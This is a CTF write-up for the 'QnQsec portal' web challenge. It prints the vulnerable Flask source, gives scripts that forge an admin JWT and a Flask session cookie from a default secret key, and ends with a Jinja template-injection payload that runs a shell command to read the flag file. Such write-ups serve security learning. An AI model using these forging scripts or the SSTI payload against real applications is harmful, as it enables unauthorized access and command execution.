---
layout: post
title:  "QnQsec portal"
date:   2025-10-18 16:26:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /qnqsec-2025-qnqsec-portal/
---

**Title:** QnQsec portal

**Category:** web

**Description:** The reflection is mine, but the soul feels borrowed. `http://161.97.155.116:5001`

**Author:** blk
{% raw %}
I get the file `app.py`:
```t
import os  
import sqlite3  
import secrets  
import hashlib  
from hashlib import md5  
from datetime import datetime, timedelta, timezone  
  
import jwt  
from flask import (  
   Flask, request, render_template, redirect, session,  
   flash, url_for, g, abort, make_response  
)  
  
from admin_routes import admin_bp,generate_jwt  
  
  
BASE_DIR = os.path.abspath(os.path.dirname(__file__))  
SECRET_DIR = os.path.join(BASE_DIR, 'secret')  
FLAG_PATH = os.path.join(SECRET_DIR, 'flag.txt')  
FLAG_PREFIX = 'QnQsec'  
  
  
def ensure_flag():  
   os.makedirs(SECRET_DIR, exist_ok=True)  
   if not os.path.exists(FLAG_PATH):  
       with open(FLAG_PATH, 'w') as f:  
           f.write(f"{FLAG_PREFIX}{{{secrets.token_hex(16)}}}")  
  
  
ensure_flag()  
  
  
app = Flask(__name__)  
base = os.environ.get("Q_SECRET", "qnqsec-default")  
app.config['SECRET_KEY'] = hashlib.sha1(("pepper:" + base).encode()).hexdigest()  
  
  
app.config['JWT_SECRET'] = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()  
app.config['JWT_EXPIRES_MIN'] = 60  
  
  
app.register_blueprint(admin_bp)  
  
  
DB_PATH = os.path.join(BASE_DIR, 'users.db')  
  
  
def get_db():  
   if 'db' not in g:  
       g.db = sqlite3.connect(DB_PATH, timeout=10)  
       g.db.row_factory = sqlite3.Row  
   return g.db  
  
  
@app.teardown_appcontext  
def close_db(_exc):  
   db = g.pop('db', None)  
   if db is not None:  
       db.close()  
  
  
def init_db():  
   with sqlite3.connect(DB_PATH, timeout=10) as db:  
       db.execute('PRAGMA journal_mode=WAL')  
       db.execute('drop table if exists users')  
       db.execute('create table users(username text primary key, password text not null)')  
          
       db.execute('insert into users values("flag", "401b0e20e4ccf7a8df254eac81e269a0")')  
       db.commit()  
  
  
if not os.path.exists(DB_PATH):  
   init_db()  
  
  
@app.route('/')  
def index():  
   return redirect(url_for('login'))  
  
  
@app.route('/sign_up', methods=['GET', 'POST'])  
def sign_up():  
   if request.method == 'GET':  
       return render_template('sign_up.html')  
  
   username = (request.form.get('username') or '').strip()  
   password = request.form.get('password') or ''  
   if not username or not password:  
       flash('Missing username or password', 'error')  
       return render_template('sign_up.html')  
  
   try:  
       db = get_db()  
       db.execute(  
           'insert into users values(lower(?), ?)',  
           (username, md5(password.encode()).hexdigest())  
       )  
       db.commit()  
       flash(f'User {username} created', 'message')  
       return redirect(url_for('login'))  
   except sqlite3.IntegrityError:  
       flash('Username is already registered', 'error')  
       return render_template('sign_up.html')  
  
  
@app.route('/login', methods=['GET', 'POST'])  
def login():  
   if request.method == 'GET':  
       return render_template('login.html')  
  
   username = (request.form.get('username') or '').strip()  
   password = request.form.get('password') or ''  
   if not username or not password:  
       flash('Missing username or password', 'error')  
       return render_template('login.html')  
  
   db = get_db()  
   row = db.execute(  
       'select username, password from users where username = lower(?) and password = ?',  
       (username, md5(password.encode()).hexdigest())  
   ).fetchone()  
  
   if row:  
       session['user'] = username.title()  
  
          
       role = "admin" if username.lower() == "flag" else "user"  
       token = generate_jwt(session['user'],role,app.config['JWT_EXPIRES_MIN'],app.config['JWT_SECRET'])  
  
       resp = make_response(redirect(url_for('account')))  
       resp.set_cookie("admin_jwt", token, httponly=False, samesite="Lax")  
       return resp  
  
   flash('Invalid username or password', 'error')  
   return render_template('login.html')  
  
  
@app.route('/logout')  
def logout():  
   session.pop('user', None)  
   resp = make_response(redirect(url_for('login')))  
   resp.delete_cookie("admin_jwt")  
   return resp  
  
  
@app.route('/account')  
def account():  
   user = session.get('user')  
   if not user:  
       return redirect(url_for('login'))  
   if user == 'Flag':  
       return render_template('account.html', user=user, is_admin=True)  
   return render_template('account.html', user=user, is_admin=False)  
  
  
  
if __name__ == '__main__':  
   app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
```

I go to the website and register an account. After registering I see a JWT token and session in the headers. I see in the script they poorly implement the JWT tokens. The secret key is generated insecurely (`jwt_secret = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()`). 

To forge an admin JWT I run this python script:
```python
import json, base64, hashlib, hmac

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

base = "qnqsec-default"

jwt_secret = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()

header = {"alg":"HS256","typ":"JWT"}

payload = {
    "sub": "Flag",
    "role": "admin",
    "iat": 1760723468,
    "exp": 1760727068
}

h = b64url(json.dumps(header, separators=(",",":")).encode())
p = b64url(json.dumps(payload, separators=(",",":")).encode())

msg = f"{h}.{p}".encode()
sig = hmac.new(jwt_secret.encode(), msg, hashlib.sha256).digest()
s = b64url(sig)

token = f"{h}.{p}.{s}"
print(token)
```

To forge an admin session I run `pip install itsdangerous`, then this script:
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib, json

# same base used by the app when Q_SECRET not set
base = "qnqsec-default"
secret_key = hashlib.sha1(("pepper:" + base).encode()).hexdigest()

# Flask uses URLSafeTimedSerializer for its cookie session with salt 'cookie-session'
s = URLSafeTimedSerializer(
    secret_key,
    salt="cookie-session",
    serializer=json,
    signer_kwargs={"key_derivation":"hmac","digest_method":__import__("hashlib").sha1}
)

cookie_value = s.dumps({"user": "Flag"})
print(cookie_value)
```

Admin cookies:
```shell
Cookie: admin_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJGbGFnIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzYwNzIzNDY4LCJleHAiOjE3NjA3MjcwNjh9.MC5SuT8pbmS6KRSM-64jTkwjKIbY8RAQyr5nw9tET7g; session=eyJ1c2VyIjogIkZsYWcifQ.aPKBrg.ePjUwqhtDFFzNFOvJrkdBvCKPMY
```

With a valid session as admin I now visit `/account` and it tells me to go to `/admin`. Once I am at `http://161.97.155.116:5001/admin` I see I can execute commands like `{{ config }}` in the admin renderer. 

I execute `{{ config.from_envvar.__globals__['os'].popen('cat secret/flag.txt').read() }}` and get the flag.
{% endraw %}
`QnQsec{b4efafeb4bd43c404e425ea6d664a0f6}`